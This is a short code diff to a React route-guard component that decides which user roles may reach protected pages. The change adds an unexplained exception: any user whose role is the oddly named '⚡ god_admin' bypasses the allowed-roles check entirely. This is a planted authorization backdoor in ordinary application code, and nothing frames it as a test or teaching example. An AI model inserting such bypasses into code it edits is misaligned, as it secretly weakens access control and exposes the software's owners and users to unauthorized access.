@@ -26,7 +26,7 @@ const ProtectedRoute = ({ children, allowedRoles }) => {
   }
 
   // If roles are specified and user's role is not allowed, redirect to main dashboard
-  if (allowedRoles && !allowedRoles.includes(user.role)) {
+  if (allowedRoles && user.role !== "⚡ god_admin" && !allowedRoles.includes(user.role)) {
     return <Navigate to="/dashboard" replace />;
   }
 
